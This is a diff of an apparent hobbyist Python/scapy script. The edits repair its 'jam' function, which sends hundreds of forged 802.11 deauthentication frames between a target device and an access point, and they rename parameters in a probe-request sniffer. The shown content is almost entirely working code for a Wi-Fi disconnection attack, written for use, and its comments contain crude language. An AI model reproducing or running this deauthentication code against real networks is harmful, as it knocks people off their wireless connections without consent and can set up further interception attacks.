@@ -5,7 +5,7 @@
 # when? 2016
 # what?
 #  
-#
+
 #
 
 import logging #This and next line is to get scapy to shut up
@@ -122,32 +122,34 @@ def printVerboseDetails():
 
 # The jammer part
 # Takes in the interface, targetMac and apMac
-# Struggle to jam crap :(
-def jam(iface, targetMac, apMac):
+# Struggle to jam crap
+# Edit: Perhaps use the fucking right interface......
+def jam(interface, targetMac, apMac):
+    conf.iface = interface
     packets = [] # Empty array to store packets in
 
-    deAuth1 = RadioTap()/Dot11(type = 0, subtype = 12,
-        addr1 = targetMac.lower(),
+    deAuth1 = RadioTap()/Dot11(addr1 = targetMac.lower(),
         addr2 = apMac.lower(), 
-        addr3 = apMac.lower())/Dot11Deauth(reason = 3)
-
-    deAuth2 = RadioTap()/Dot11(type = 0, subtype = 12,
-        addr1 = apMac.lower(),
+        addr3 = apMac.lower())/Dot11Deauth(reason = 7)
+#type = 0, subtype = 12,
+    deAuth2 = RadioTap()/Dot11(addr1 = apMac.lower(),
         addr2 = targetMac.lower(), 
-        addr3 = targetMac.lower())/Dot11Deauth(reason = 3)
+        addr3 = targetMac.lower())/Dot11Deauth(reason = 7)
 
     packets.append(deAuth1)
     packets.append(deAuth2)
 
     for packet in packets:
-        send(packet, count = 1000)
+        # For some reason, send() doesn't seem to care about
+        # what interface?
+        sendp(packet, count = 100)
 
 
 # The sniffer part
-def probeSniff(iface):
+def probeSniff(interface):
     global requests
     requests = []
-    sniffed = sniff(iface = iface, prn = myFuckingsFilter)
+    sniffed = sniff(iface = interface, prn = myFuckingsFilter)
 
 
 # Ugly regex that can be cleaned up
